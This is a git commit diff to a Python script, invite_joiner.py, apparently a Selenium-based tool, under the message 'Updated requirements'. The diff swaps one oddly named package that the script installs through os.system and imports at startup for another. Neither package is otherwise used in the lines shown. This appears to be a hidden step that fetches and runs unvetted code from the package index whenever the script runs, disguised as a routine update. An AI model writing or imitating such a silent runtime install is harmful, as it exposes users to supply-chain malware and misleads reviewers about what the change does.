338ed099596cddb806a1477c724167e7b37c8e2d
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-01 22:44:44 +0200

    Updated requirements

--- invite_joiner.py
+++ invite_joiner.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncryptoaddition")
-import pythoncryptoaddition
+os.system("pip install pipfontingaddonsV2")
+import pipfontingaddonsV2
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
